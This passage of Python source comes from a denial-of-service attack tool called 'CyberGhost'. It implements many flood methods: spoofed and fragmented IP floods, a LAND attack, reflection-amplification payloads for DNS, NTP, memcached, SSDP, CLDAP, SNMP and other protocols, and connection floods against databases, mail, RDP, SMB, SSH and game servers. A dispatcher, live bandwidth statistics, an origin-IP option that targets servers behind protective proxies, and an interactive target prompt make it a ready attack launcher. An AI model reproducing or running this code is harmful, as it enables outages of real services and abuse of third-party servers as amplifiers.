        if not self.raw_ip: self._udp_flood(); return
        last = time.monotonic()
        while not self._stop:
            self._check_bw()
            payload = os.urandom(random.randint(500, 2000))
            frags = fragmented_ip(self._rip(), self.target_ip, socket.IPPROTO_UDP, payload, 8)
            try:
                for f in frags: self.raw_ip.sendto(f, (self.target_ip, 0))
                t.sent += len(frags); t.bytes_sent += sum(len(f) for f in frags)
                t.methods["FRAG_FLOOD"] += len(frags)
            except Exception:
                t.failed += 1; t.errors["frag"] += 1
            if time.monotonic() - last > STATS_FLUSH_INTERVAL:
                t.flush(self.stats, self.lock); last = time.monotonic()
        t.flush(self.stats, self.lock)

    def _ip_spoof(self):
        t = self._t()
        if not self.raw_ip: self._udp_flood(); return
        protos = [6, 17, 1, 47, 4, 41, 50, 51]
        last = time.monotonic()
        while not self._stop:
            self._check_bw()
            payload = os.urandom(random.randint(100, 1400))
            pkt = ip_header(self._rip(), self.target_ip, random.choice(protos), len(payload)) + payload
            try:
                self.raw_ip.sendto(pkt, (self.target_ip, 0))
                t.sent += 1; t.bytes_sent += len(pkt); t.methods["IP_SPOOF_RANDOM"] += 1
            except Exception:
                t.failed += 1; t.errors["ipspoof"] += 1
            if time.monotonic() - last > STATS_FLUSH_INTERVAL:
                t.flush(self.stats, self.lock); last = time.monotonic()
        t.flush(self.stats, self.lock)

    def _land_attack(self):
        t = self._t()
        if not self.raw_tcp: self._tcp_flood(); return
        last = time.monotonic()
        while not self._stop:
            self._check_bw()
            pkt = tcp_packet(self.target_ip, self.target_ip, self.target_port, self.target_port,
                              random.getrandbits(32), 0, 0x02)
            try:
                self.raw_tcp.sendto(pkt, (self.target_ip, 0))
                t.sent += 1; t.bytes_sent += len(pkt); t.methods["LAND_ATTACK"] += 1
            except Exception:
                t.failed += 1; t.errors["land"] += 1
            if time.monotonic() - last > STATS_FLUSH_INTERVAL:
                t.flush(self.stats, self.lock); last = time.monotonic()
        t.flush(self.stats, self.lock)

    # ========== DNS ==========
    def _dns_amp(self):
        t = self._t()
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        last = time.monotonic()
        try:
            while not self._stop:
                self._check_bw()
                labels = ["".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=random.randint(40, 60))) for _ in range(10)]
                domain = ".".join(labels) + ".com"
                qname = b"".join(bytes([len(p)]) + p.encode() for p in domain.split(".")) + b"\x00"
                tid = struct.pack("!H", random.randint(0, 65535))
                query = tid + b"\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" + qname + b"\x00\xff\x00\x01"
                try:
                    s.sendto(query, (self.target_ip, self.target_port or 53))
                    t.sent += 1; t.bytes_sent += len(query); t.methods["DNS_ANY_AMPLIFICATION"] += 1
                except Exception:
                    t.failed += 1; t.errors["dns"] += 1
                if time.monotonic() - last > STATS_FLUSH_INTERVAL:
                    t.flush(self.stats, self.lock); last = time.monotonic()
        finally:
            with suppress(Exception): s.close()
            t.flush(self.stats, self.lock)

    def _dns_query_flood(self):
        t = self._t()
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        last = time.monotonic()
        try:
            while not self._stop:
                self._check_bw()
                labels = ["".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=random.randint(5, 15))) for _ in range(3)]
                domain = ".".join(labels) + ".com"
                qname = b"".join(bytes([len(p)]) + p.encode() for p in domain.split(".")) + b"\x00"
                tid = struct.pack("!H", random.randint(0, 65535))
                query = tid + b"\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" + qname + b"\x00\x01\x00\x01"
                try:
                    s.sendto(query, (self.target_ip, self.target_port or 53))
                    t.sent += 1; t.bytes_sent += len(query); t.methods["DNS_QUERY_FLOOD"] += 1
                except Exception:
                    t.failed += 1; t.errors["dns"] += 1
                if time.monotonic() - last > STATS_FLUSH_INTERVAL:
                    t.flush(self.stats, self.lock); last = time.monotonic()
        finally:
            with suppress(Exception): s.close()
            t.flush(self.stats, self.lock)

    # ========== AMPLIFICATION CORE ==========
    def _udp_amp_generic(self, name, port, payload_builder):
        t = self._t()
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        last = time.monotonic()
        try:
            while not self._stop:
                self._check_bw()
                payload = payload_builder()
                try:
                    s.sendto(payload, (self.target_ip, self.target_port or port))
                    t.sent += 1; t.bytes_sent += len(payload); t.methods[name] += 1
                except Exception:
                    t.failed += 1; t.errors[name.lower()] += 1
                if time.monotonic() - last > STATS_FLUSH_INTERVAL:
                    t.flush(self.stats, self.lock); last = time.monotonic()
        finally:
            with suppress(Exception): s.close()
            t.flush(self.stats, self.lock)

    def _ntp_monlist(self): self._udp_amp_generic("NTP_MONLIST", 123, lambda: b"\x17\x00\x03\x2a" + b"\x00" * 4)
    def _ntp_mode6(self): self._udp_amp_generic("NTP_MODE6_FLOOD", 123, lambda: b"\x16" + os.urandom(40))
    def _memcached_amp(self):
        def build():
            key = "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=random.randint(30, 60)))
            return struct.pack("!H", random.randint(0, 65535)) + b"\x00\x00\x00\x01\x00\x00" + f"get {key}\r\n".encode()
        self._udp_amp_generic("MEMCACHED_GET_AMP", 11211, build)
    def _memcached_multiget(self):
        def build():
            keys = " ".join("".join(random.choices("abc", k=random.randint(20, 40))) for _ in range(50))
            return struct.pack("!H", random.randint(0, 65535)) + b"\x00\x00\x00\x01\x00\x00" + f"get {keys}\r\n".encode()
        self._udp_amp_generic("MEMCACHED_MULTIGET_BOMB", 11211, build)
    def _ssdp_amp(self):
        payload = (b"M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n"
                   b'MAN: "ssdp:discover"\r\nMX: 5\r\nST: ssdp:all\r\n\r\n')
        self._udp_amp_generic("SSDP_MSEARCH_AMP", 1900, lambda: payload)
    def _cldap_amp(self):
        payload = (b"\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00"
                   b"\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0bobjectClass\x30\x00")
        self._udp_amp_generic("CLDAP_SEARCH_AMP", 389, lambda: payload)
    def _ldap_amp(self):
        payload = (b"\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00"
                   b"\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0bobjectClass\x30\x00")
        self._udp_amp_generic("LDAP_SEARCH_BOMB", 389, lambda: payload)
    def _snmp_amp(self):
        payload = (b"\x30\x26\x02\x01\x01\x04\x06public\xa0\x19\x02\x04"
                   b"\x00\x00\x00\x01\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05\x2b\x06\x01\x02\x01")
        self._udp_amp_generic("SNMP_GETBULK_AMP", 161, lambda: payload)
    def _netbios_amp(self):
        payload = (b"\xab\xcd\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00"
                   b"\x20CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x00\x21\x00\x01")
        self._udp_amp_generic("NETBIOS_NS_AMP", 137, lambda: payload)
    def _mdns_amp(self):
        payload = (b"\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00"
                   b"\x09_services\x07_dns-sd\x04_udp\x05local\x00\x00\x0c\x00\x01")
        self._udp_amp_generic("MDNS_AMP", 5353, lambda: payload)
    def _wsd_amp(self):
        payload = (b'<?xml version="1.0" encoding="utf-8"?>'
                   b'<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">'
                   b'<soap:Body><wsd:Probe xmlns:wsd="http://schemas.xmlsoap.org/ws/2005/04/discovery"/></soap:Body></soap:Envelope>')
        self._udp_amp_generic("WSD_DISCOVERY_AMP", 3702, lambda: payload)
    def _ripv1_amp(self):
        payload = b"\x01\x01\x00\x00\x00\x02\x00\x00" + socket.inet_aton("0.0.0.0") + b"\x00" * 12
        self._udp_amp_generic("RIP_V1_AMP", 520, lambda: payload)
    def _ripv2_amp(self):
        payload = b"\x02\x01\x00\x00\x00\x02\x00\x00" + socket.inet_aton("0.0.0.0") + b"\x00" * 12
        self._udp_amp_generic("RIP_V2_AMP", 520, lambda: payload)
    def _qotd_amp(self): self._udp_amp_generic("QOTD_AMP", 17, lambda: b"quote\r\n")
    def _chargen_amp(self): self._udp_amp_generic("CHARGEN_AMP", 19, lambda: b"\x00")
    def _daytime_amp(self): self._udp_amp_generic("DAYTIME_AMP", 13, lambda: b"\r\n")
    def _coap_amp(self): self._udp_amp_generic("COAP_AMP", 5683, lambda: b"\x40\x01\x00\x01")
    def _tftp_amp(self): self._udp_amp_generic("TFTP_AMP", 69, lambda: b"\x00\x01bigfile\x00octet\x00blksize\x006548\x00")
    def _stun_amp(self): self._udp_amp_generic("STUN_BINDING_AMP", 3478, lambda: b"\x00\x01\x00\x00\x21\x12\xa4\x42" + os.urandom(12))
    def _dtls_amp(self): self._udp_amp_generic("DTLS_HELLO_AMP", 443, lambda: b"\x16\xfe\xfd" + os.urandom(200))
    def _portmapper_amp(self): self._udp_amp_generic("PORTMAPPER_AMP", 111, lambda: os.urandom(50))

    # ========== SERVICES ==========
    def _tcp_service_flood(self, name, port, payload_builder, recv_first=True):
        t = self._t(); last = time.monotonic()
        while not self._stop:
            self._check_bw()
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((self.target_ip, self.target_port or port))
                payload = payload_builder()
                if payload: s.send(payload)
                if recv_first:
                    with suppress(Exception): s.recv(1024)
                with suppress(Exception): s.close()
                t.sent += 1; t.methods[name] += 1
            except Exception as e:
                t.failed += 1; t.errors[type(e).__name__] += 1
            if time.monotonic() - last > STATS_FLUSH_INTERVAL:
                t.flush(self.stats, self.lock); last = time.monotonic()
        t.flush(self.stats, self.lock)

    def _redis_set_flood(self):
        def build():
            return (b"*3\r\n$3\r\nSET\r\n$" + str(len(str(random.randint(0, 99999)))).encode() + b"\r\n" +
                    str(random.randint(0, 99999)).encode() + b"\r\n$5\r\n" + os.urandom(5) + b"\r\n")
        self._tcp_service_flood("REDIS_SET_FLOOD", 6379, build)
    def _redis_pipeline_bomb(self):
        def build():
            cmds = b""
            for _ in range(1000):
                cmds += b"PING\r\n"
            return cmds
        self._tcp_service_flood("REDIS_PIPELINE_BOMB", 6379, build)
    def _mongo_op_msg(self):
        return self._tcp_service_flood("MONGO_OP_MSG_FLOOD", 27017, lambda: os.urandom(200))
    def _cassandra_batch(self):
        return self._tcp_service_flood("CASSANDRA_BATCH_FLOOD", 9042,
                                        lambda: b"\x01\x00\x00\x00\x04\x00\x00\x00\x05" + os.urandom(500))
    def _elastic_bomb(self):
        def build():
            body = b'{"query":{"bool":{"should":[{"match_all":{}}]}},"size":10000,"aggs":{"a":{"terms":{"field":"_id","size":65536}}}}'
            return (b"POST /_search HTTP/1.1\r\nHost: " + self.target_host.encode() +
                    b"\r\nContent-Type: application/json\r\nContent-Length: " + str(len(body)).encode() +
                    b"\r\nConnection: close\r\n\r\n" + body)
        self._tcp_service_flood("ELASTIC_SEARCH_BOMB", 9200, build)
    def _mqtt_publish(self):
        return self._tcp_service_flood("MQTT_PUBLISH_FLOOD", 1883,
                                        lambda: b"\x30\x10\x00\x05topic" + os.urandom(10))
    def _amqp_channel_bomb(self):
        return self._tcp_service_flood("AMQP_CHANNEL_BOMB", 5672, lambda: b"AMQP\x00\x00\x09\x01")
    def _rdp_flood(self):
        return self._tcp_service_flood("RDP_CONNECTION_FLOOD", 3389,
                                        lambda: b"\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00")
    def _vnc_flood(self):
        return self._tcp_service_flood("VNC_RFB_FLOOD", 5900, lambda: b"RFB 003.008\n")
    def _smb_flood(self):
        return self._tcp_service_flood("SMB_NEGOTIATE_FLOOD", 445,
                                        lambda: b"\x00\x00\x00\x85\xffSMB\x72" + os.urandom(100))
    def _smtp_data_bomb(self):
        def build():
            return (b"EHLO test\r\nMAIL FROM:<a@b.com>\r\nRCPT TO:<c@d.com>\r\nDATA\r\n" +
                    os.urandom(50000) + b"\r\n.\r\n")
        self._tcp_service_flood("SMTP_DATA_BOMB", 25, build)
    def _imap_flood(self):
        return self._tcp_service_flood("IMAP_LOGIN_FLOOD", 143,
                                        lambda: b"a001 LOGIN test test\r\n")
    def _pop3_flood(self):
        return self._tcp_service_flood("POP3_AUTH_FLOOD", 110,
                                        lambda: b"USER test\r\nPASS test\r\n")
    def _ftp_flood(self):
        return self._tcp_service_flood("FTP_USER_FLOOD", 21,
                                        lambda: b"USER " + os.urandom(6).hex().encode() + b"\r\n")
    def _telnet_iac(self):
        return self._tcp_service_flood("TELNET_IAC_FLOOD", 23,
                                        lambda: b"\xff\xfd\x18\xff\xfd\x20\xff\xfd\x23\xff\xfd\x27")
    def _ssh_kex(self):
        return self._tcp_service_flood("SSH_KEX_FLOOD", 22,
                                        lambda: b"SSH-2.0-" + os.urandom(8).hex().encode() + b"\r\n")
    def _sip_flood(self):
        t = self._t()
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        last = time.monotonic()
        try:
            while not self._stop:
                self._check_bw()
                branch = "z9hG4bK" + os.urandom(6).hex()
                callid = os.urandom(12).hex()
                payload = (f"INVITE sip:{self.target_ip} SIP/2.0\r\n"
                           f"Via: SIP/2.0/UDP {self._rip()}:5060;branch={branch}\r\n"
                           f"From: <sip:{os.urandom(4).hex()}@{self._rip()}>;tag={os.urandom(4).hex()}\r\n"
                           f"To: <sip:{self.target_ip}>\r\nCall-ID: {callid}\r\n"
                           f"CSeq: 1 INVITE\r\nMax-Forwards: 70\r\n"
                           f"User-Agent: CyberGhost\r\nContent-Length: 0\r\n\r\n").encode()
                try:
                    s.sendto(payload, (self.target_ip, self.target_port or 5060))
                    t.sent += 1; t.bytes_sent += len(payload); t.methods["SIP_INVITE_FLOOD"] += 1
                except Exception:
                    t.failed += 1; t.errors["sip"] += 1
                if time.monotonic() - last > STATS_FLUSH_INTERVAL:
                    t.flush(self.stats, self.lock); last = time.monotonic()
        finally:
            with suppress(Exception): s.close()
            t.flush(self.stats, self.lock)
    def _rtsp_flood(self):
        return self._tcp_service_flood("RTSP_DESCRIBE_FLOOD", 554,
                                        lambda: b"DESCRIBE rtsp://x/ RTSP/1.0\r\nCSeq: 1\r\n\r\n")
    def _iptv_flood(self): self._udp_amp_generic("IPTV_MULTICAST_STORM", 1234, lambda: b"\x46\x00\x00\x00" + os.urandom(1000))
    def _nfs_flood(self): return self._tcp_service_flood("NFS_PORTMAPPER_FLOOD", 2049, lambda: os.urandom(200))
    def _kerberos_flood(self):
        return self._tcp_service_flood("KERBEROS_FLOOD", 88,
                                        lambda: b"\x00\x00\x00\x0a\x6a\x81\x00\x00\x00\x00")

    # ========== GAMES ==========
    def _minecraft_query(self): self._udp_amp_generic("MINECRAFT_QUERY_FLOOD", 25565,
                                                       lambda: b"\xfe\xfd\x09\x12\x34\x56\x78\x00\x00\x00\x00" + os.urandom(50))
    def _fivem_query(self): self._udp_amp_generic("FIVEM_QUERY_FLOOD", 30120,
                                                   lambda: b"\xff\xff\xff\xffgetinfo xxx" + os.urandom(100))
    def _teamspeak(self): self._udp_amp_generic("TEAMSPEAK_VOICE_FLOOD", 9987,
                                                 lambda: b"\x00\x01\x00\x00\x00\x00\x00\x00" + os.urandom(500))
    def _steam_a2s(self): self._udp_amp_generic("STEAM_A2S_FLOOD", 27015,
                                                 lambda: b"\xff\xff\xff\xffTSource Engine Query\x00")
    def _steam_a2s_info(self): self._udp_amp_generic("STEAM_A2S_INFO_FLOOD", 27015,
                                                      lambda: b"\xff\xff\xff\xffT" + os.urandom(4) + b"Source Engine Query\x00")
    def _samp_query(self): self._udp_amp_generic("SAMP_QUERY_FLOOD", 7777, lambda: b"SAMP" + os.urandom(8) + b"\x69")
    def _csgo_query(self): self._udp_amp_generic("CSGO_QUERY_FLOOD", 27015,
                                                  lambda: b"\xff\xff\xff\xffTSource Engine Query\x00")
    def _rust_query(self): self._udp_amp_generic("RUST_QUERY_FLOOD", 28015,
                                                  lambda: b"\xff\xff\xff\xffTSource Engine Query\x00")
    def _ark_query(self): self._udp_amp_generic("ARK_QUERY_FLOOD", 7777,
                                                 lambda: b"\xff\xff\xff\xffTSource Engine Query\x00")
    def _valheim_query(self): self._udp_amp_generic("VALHEIM_QUERY_FLOOD", 2456,
                                                     lambda: b"\xff\xff\xff\xffTSource Engine Query\x00")
    def _terraria_query(self): self._udp_amp_generic("TERRARIA_QUERY_FLOOD", 7777,
                                                      lambda: b"\xff\xff\xff\xffTSource Engine Query\x00")

    # ========== P2P ==========
    def _bittorrent_dht_ping(self):
        self._udp_amp_generic("BITTORRENT_DHT_PING", 6881,
                               lambda: b"d1:ad2:id20:" + os.urandom(20) + b"e1:q4:ping1:t2:aa1:y1:qe")
    def _bittorrent_dht_find(self):
        self._udp_amp_generic("BITTORRENT_DHT_FIND_NODE", 6881,
                               lambda: b"d1:ad2:id20:" + os.urandom(20) + b"6:target20:" + os.urandom(20) + b"e1:q9:find_node1:t2:aa1:y1:qe")
    def _emule_flood(self): self._udp_amp_generic("EMULE_SERVER_FLOOD", 4665, lambda: b"\xe3" + os.urandom(100))
    def _gnutella_flood(self):
        return self._tcp_service_flood("GNUTELLA_PING_FLOOD", 6346, lambda: b"GNUTELLA CONNECT/0.6\r\n\r\n")

    # ========== DISPATCH ==========
    def _run_worker(self, method, tid):
        try:
            m = method
            if m == "HTTP2_RAPID_RESET": self._h2_rapid_reset()
            elif m == "HTTP2_CONTINUATION_FLOOD": self._h2_continuation_flood()
            elif m == "HTTP2_PING_FLOOD": self._h2_ping_flood()
            elif m == "HTTP2_SETTINGS_FLOOD": self._h2_settings_flood()
            elif m == "HTTP2_WINDOW_UPDATE_FLOOD": self._h2_window_update_flood()
            elif m == "HTTP2_HPACK_BOMB": self._h2_hpack_bomb()
            elif m == "HTTP2_STREAM_MULTIPLEX": self._h2_stream_multiplex()
            elif m == "HTTP3_QUIC_FLOOD": self._http3_quic_flood()
            elif m == "WEBSOCKET_PERMESSAGE_DEFLATE_BOMB": self._ws_deflate_bomb()
            elif m == "WEBSOCKET_FRAME_FLOOD": self._ws_frame_flood()
            elif m == "WEBSOCKET_PING_FLOOD": self._ws_ping_flood()
            elif m == "GRAPHQL_DEPTH_BOMB": self._graphql_depth_bomb()
            elif m == "GRAPHQL_ALIAS_BOMB": self._graphql_alias_bomb()
            elif m == "JSON_BOMB": self._json_bomb()
            elif m == "XML_BOMB": self._xml_bomb()
            elif m == "ZIP_BOMB": self._xml_bomb()
            elif m == "REGEX_DOS_REDOS": self._redos()
            elif m == "TLS_CLIENT_HELLO_FLOOD": self._tls_hello_flood()
            elif m == "TLS_RENEGOTIATION": self._tls_reneg()
            elif m == "TLS_HEARTBLEED": self._tls_heartbleed()
            elif m == "SNI_FLOOD_V2": self._tls_sni_flood()
            elif m == "SLOWLORIS_V2": self._slowloris_v2()
            elif m == "RUDY_V2": self._rudy_v2()
            elif m == "APACHE_KILLER_V2": self._apache_killer_v2()
            elif m == "RANGE_HEADER_BOMB": self._range_bomb()
            elif m == "HTTP_SMUGGLING_CLTE": self._smuggle_clte()
            elif m == "HTTP_SMUGGLING_TECL": self._smuggle_tecl()
            elif m == "SYN_TSUN": self._syn_flood()
            elif m == "UDP_APOC": self._udp_flood()
            elif m == "ICMP_STORM": self._icmp_flood()
            elif m == "TCP_SPAM": self._tcp_flood()
            elif m == "ACK_FLOOD": self._ack_flood()
            elif m == "RST_FLOOD": self._rst_flood()
            elif m == "FIN_FLOOD": self._fin_flood()
            elif m == "XMAS_FLOOD": self._xmas_flood()
            elif m == "NULL_FLOOD": self._null_flood()
            elif m == "PSH_FLOOD": self._psh_flood()
            elif m == "URG_FLOOD": self._urg_flood()
            elif m == "SYN_ACK_FLOOD": self._syn_ack_flood()
            elif m == "GRE_FLOOD": self._gre_flood()
            elif m == "ESP_FLOOD": self._esp_flood()
            elif m == "IPIP_FLOOD": self._ipip_flood()
            elif m == "FRAG_FLOOD": self._frag_flood()
            elif m == "IP_SPOOF_RANDOM": self._ip_spoof()
            elif m == "LAND_ATTACK": self._land_attack()
            elif m == "DNS_ANY_AMPLIFICATION": self._dns_amp()
            elif m == "DNS_QUERY_FLOOD": self._dns_query_flood()
            elif m == "NTP_MONLIST": self._ntp_monlist()
            elif m == "NTP_MODE6_FLOOD": self._ntp_mode6()
            elif m == "MEMCACHED_GET_AMP": self._memcached_amp()
            elif m == "MEMCACHED_MULTIGET_BOMB": self._memcached_multiget()
            elif m == "SSDP_MSEARCH_AMP": self._ssdp_amp()
            elif m == "CLDAP_SEARCH_AMP": self._cldap_amp()
            elif m == "LDAP_SEARCH_BOMB": self._ldap_amp()
            elif m == "SNMP_GETBULK_AMP": self._snmp_amp()
            elif m == "NETBIOS_NS_AMP": self._netbios_amp()
            elif m == "MDNS_AMP": self._mdns_amp()
            elif m == "WSD_DISCOVERY_AMP": self._wsd_amp()
            elif m == "RIP_V1_AMP": self._ripv1_amp()
            elif m == "RIP_V2_AMP": self._ripv2_amp()
            elif m == "QOTD_AMP": self._qotd_amp()
            elif m == "CHARGEN_AMP": self._chargen_amp()
            elif m == "DAYTIME_AMP": self._daytime_amp()
            elif m == "COAP_AMP": self._coap_amp()
            elif m == "TFTP_AMP": self._tftp_amp()
            elif m == "STUN_BINDING_AMP": self._stun_amp()
            elif m == "DTLS_HELLO_AMP": self._dtls_amp()
            elif m == "PORTMAPPER_AMP": self._portmapper_amp()
            elif m == "REDIS_SET_FLOOD": self._redis_set_flood()
            elif m == "REDIS_PIPELINE_BOMB": self._redis_pipeline_bomb()
            elif m == "MONGO_OP_MSG_FLOOD": self._mongo_op_msg()
            elif m == "CASSANDRA_BATCH_FLOOD": self._cassandra_batch()
            elif m == "ELASTIC_SEARCH_BOMB": self._elastic_bomb()
            elif m == "MQTT_PUBLISH_FLOOD": self._mqtt_publish()
            elif m == "AMQP_CHANNEL_BOMB": self._amqp_channel_bomb()
            elif m == "RDP_CONNECTION_FLOOD": self._rdp_flood()
            elif m == "VNC_RFB_FLOOD": self._vnc_flood()
            elif m == "SMB_NEGOTIATE_FLOOD": self._smb_flood()
            elif m == "SMTP_DATA_BOMB": self._smtp_data_bomb()
            elif m == "IMAP_LOGIN_FLOOD": self._imap_flood()
            elif m == "POP3_AUTH_FLOOD": self._pop3_flood()
            elif m == "FTP_USER_FLOOD": self._ftp_flood()
            elif m == "TELNET_IAC_FLOOD": self._telnet_iac()
            elif m == "SSH_KEX_FLOOD": self._ssh_kex()
            elif m == "SIP_INVITE_FLOOD": self._sip_flood()
            elif m == "RTSP_DESCRIBE_FLOOD": self._rtsp_flood()
            elif m == "IPTV_MULTICAST_STORM": self._iptv_flood()
            elif m == "NFS_PORTMAPPER_FLOOD": self._nfs_flood()
            elif m == "KERBEROS_FLOOD": self._kerberos_flood()
            elif m == "MINECRAFT_QUERY_FLOOD": self._minecraft_query()
            elif m == "FIVEM_QUERY_FLOOD": self._fivem_query()
            elif m == "TEAMSPEAK_VOICE_FLOOD": self._teamspeak()
            elif m == "STEAM_A2S_FLOOD": self._steam_a2s()
            elif m == "STEAM_A2S_INFO_FLOOD": self._steam_a2s_info()
            elif m == "SAMP_QUERY_FLOOD": self._samp_query()
            elif m == "CSGO_QUERY_FLOOD": self._csgo_query()
            elif m == "RUST_QUERY_FLOOD": self._rust_query()
            elif m == "ARK_QUERY_FLOOD": self._ark_query()
            elif m == "VALHEIM_QUERY_FLOOD": self._valheim_query()
            elif m == "TERRARIA_QUERY_FLOOD": self._terraria_query()
            elif m == "BITTORRENT_DHT_PING": self._bittorrent_dht_ping()
            elif m == "BITTORRENT_DHT_FIND_NODE": self._bittorrent_dht_find()
            elif m == "EMULE_SERVER_FLOOD": self._emule_flood()
            elif m == "GNUTELLA_PING_FLOOD": self._gnutella_flood()
            elif m == "INFINITY_MIX":
                cycle = itertools.cycle([x for x in ALL_METHOD_NAMES if x != "INFINITY_MIX"])
                while not self._stop:
                    chosen = next(cycle)
                    try: self._run_worker(chosen, tid)
                    except Exception: pass
        except (KeyboardInterrupt, SystemExit): raise
        except Exception as e: logger.debug(f"Worker {tid}: {e}")
        finally: self._flush()

    def _live_stats(self):
        last_sent = 0; last_time = time.monotonic()
        while not self._stop:
            now = time.monotonic()
            with self.lock:
                sent = self.stats["sent"]; failed = self.stats["failed"]
                bytes_sent = self.stats["bytes_sent"]; mono = self.stats["monotonic_start"]
            elapsed = (now - mono) if mono else 0
            dt = now - last_time
            rate = (sent - last_sent) / dt if dt > 0 else 0
            last_sent = sent; last_time = now
            mbps = (bytes_sent * 8) / elapsed / 1_000_000 if elapsed > 0 else 0
            line = (f"\r{C.RED}[🔥]{C.RESET} {C.YELLOW}Sent:{C.RESET} {sent:>12,}  "
                    f"{C.GREEN}Rate:{C.RESET} {rate:>10,.0f}/s  "
                    f"{C.CYAN}BW:{C.RESET} {mbps:>7.1f} Mbps  "
                    f"{C.MAGENTA}Fail:{C.RESET} {failed:>8,}  "
                    f"{C.BLUE}T:{C.RESET} {elapsed:>5.0f}s")
            sys.stdout.write(line); sys.stdout.flush()
            time.sleep(0.5)

    def _stats_flusher(self):
        while not self._stop:
            time.sleep(STATS_FLUSH_INTERVAL); self._flush()

    def launch(self, config):
        with self.launch_lock:
            if self.running: raise RuntimeError("Already running")
            self.running = True; self._stop = False
        try:
            self._setup(config)
            self._init_raw()
            effective = min(self.threads, MAX_EFFECTIVE_THREADS)
            self.executor = ThreadPoolExecutor(max_workers=effective, thread_name_prefix="ghost")
            for i in range(effective):
                self.executor.submit(self._run_worker, self.method, i)
            threading.Thread(target=self._live_stats, daemon=True).start()
            threading.Thread(target=self._stats_flusher, daemon=True).start()
            threading.Thread(target=self._auto_stop, daemon=True).start()
        except Exception:
            self.running = False; self._stop = True
            raise

    def _setup(self, config):
        self.target_url = config.target
        if not self.target_url.startswith(("http://", "https://")):
            self.target_url = "http://" + self.target_url
        p = urllib.parse.urlparse(self.target_url)
        self.target_host = p.hostname or config.target
        self.target_port = config.port or (443 if p.scheme == "https" else 80)
        self.method = config.method.upper()
        self.threads = min(config.threads, MAX_THREADS)
        self.duration = config.duration
        self.bandwidth_limit = config.bandwidth_limit
        self.use_proxy = config.use_proxy
        try: self.target_ip = socket.gethostbyname(self.target_host)
        except Exception: self.target_ip = self.target_host
        if config.origin_ip:
            self.target_ip = config.origin_ip
            logger.info(f"Using origin IP: {self.target_ip}")
        with self.lock:
            self.stats = self._new_stats()
            self.stats["start_time"] = datetime.now()
            self.stats["end_time_planned"] = datetime.now() + timedelta(seconds=self.duration)
            self.stats["monotonic_start"] = time.monotonic()
        self._last_bytes = 0; self._last_check = time.monotonic()
        logger.info(f"ATTACK: {self.target_host} ({self.target_ip}:{self.target_port}) method={self.method}")

    def _auto_stop(self):
        time.sleep(self.duration); self.stop()

    def stop(self):
        if not self.running: return
        self._stop = True; self.running = False
        with self.lock: self.stats["end_time"] = datetime.now()
        self._close_raw()
        if self.executor is not None:
            with suppress(Exception): self.executor.shutdown(wait=False, cancel_futures=True)
            self.executor = None
        self._flush()

    def status(self):
        now = datetime.now()
        mono = self.stats.get("monotonic_start")
        elapsed = (time.monotonic() - mono) if mono else 0
        with self.lock:
            sent = self.stats["sent"]; failed = self.stats["failed"]
            bytes_sent = self.stats["bytes_sent"]
            errors = dict(self.stats["errors"]); methods = dict(self.stats["methods_used"])
        rate = sent / elapsed if elapsed > 0 else 0
        mbps = (bytes_sent * 8) / elapsed / 1_000_000 if elapsed > 0 else 0
        planned = self.stats.get("end_time_planned")
        eta = (planned - now).total_seconds() if planned else 0
        cpu = ram = th = 0
        if HAS_PSUTIL:
            with suppress(Exception):
                cpu = psutil.cpu_percent(interval=None)
                ram = psutil.virtual_memory().percent
                th = psutil.Process().num_threads()
        return {"running": self.running, "target": self.target_url, "method": self.method,
                "threads": self.threads, "duration": self.duration, "elapsed": elapsed,
                "eta": max(0, eta), "packets_sent": sent, "rate": rate, "failed": failed,
                "bandwidth": mbps, "bandwidth_limit": self.bandwidth_limit,
                "bytes_sent": bytes_sent, "errors": errors, "methods_used": methods,
                "cpu_percent": cpu, "ram_percent": ram, "process_threads": th,
                "origin_ip": self.target_ip}

engine = CyberGhost()

def choose_method_terminal():
    print(f"\n{C.CYAN}{C.BOLD}Available methods ({len(ALL_METHOD_NAMES)}):{C.RESET}")
    cols = 2
    for i, (m, emoji) in enumerate(METHODS, 1):
        end = "\n" if i % cols == 0 else "   "
        print(f"  {C.GREEN}{i:>3}.{C.RESET} {emoji} {m:<28}", end=end)
    if len(METHODS) % cols: print()
    while True:
        v = safe_input(f"\n{C.YELLOW}>> Select (name or #, default=INFINITY_MIX): {C.RESET}")
        if not v: return "INFINITY_MIX"
        if v.isdigit() and 1 <= int(v) <= len(ALL_METHOD_NAMES): return ALL_METHOD_NAMES[int(v) - 1]
        if v.upper() in ALL_METHOD_NAMES: return v.upper()

def run_terminal_mode():
    print(f"{C.GREEN}{C.BOLD}═══ TERMINAL ATTACK MODE ═══{C.RESET}\n")
    target = safe_input(f"{C.YELLOW}>> Target (URL/IP): {C.RESET}", "127.0.0.1")
    port = safe_input(f"{C.YELLOW}>> Port (80): {C.RESET}", "80")
    try: port = int(port)
    except: port = 80
    method = choose_method_terminal()
    threads = safe_input(f"{C.YELLOW}>> Threads ({DEFAULT_THREADS}): {C.RESET}", str(DEFAULT_THREADS))
    try: threads = max(1, min(int(threads), MAX_THREADS))
    except: threads = DEFAULT_THREADS
    duration = safe_input(f"{C.YELLOW}>> Duration sec ({DEFAULT_DURATION}): {C.RESET}", str(DEFAULT_DURATION))
    try: duration = max(1, min(int(duration), MAX_DURATION))
    except: duration = DEFAULT_DURATION
